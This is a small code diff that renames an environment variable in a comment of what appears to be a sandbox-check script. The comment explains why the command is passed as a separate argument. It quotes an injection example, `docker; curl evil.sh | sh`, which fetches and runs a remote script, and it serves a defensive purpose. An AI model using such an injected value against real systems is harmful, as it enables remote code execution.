@@ -96,7 +96,7 @@ hopcodeSandbox = (hopcodeSandbox || '').toLowerCase();
 
 const commandExists = (cmd) => {
   // Pass `cmd` as a separate argv element (never interpolated into a shell
-  // command string) so a malicious QWEN_SANDBOX value such as
+  // command string) so a malicious HOPCODE_SANDBOX value such as
   // `docker; curl evil.sh | sh` cannot inject extra commands.
   const check = (candidate) => {
     if (os.platform() === 'win32') {
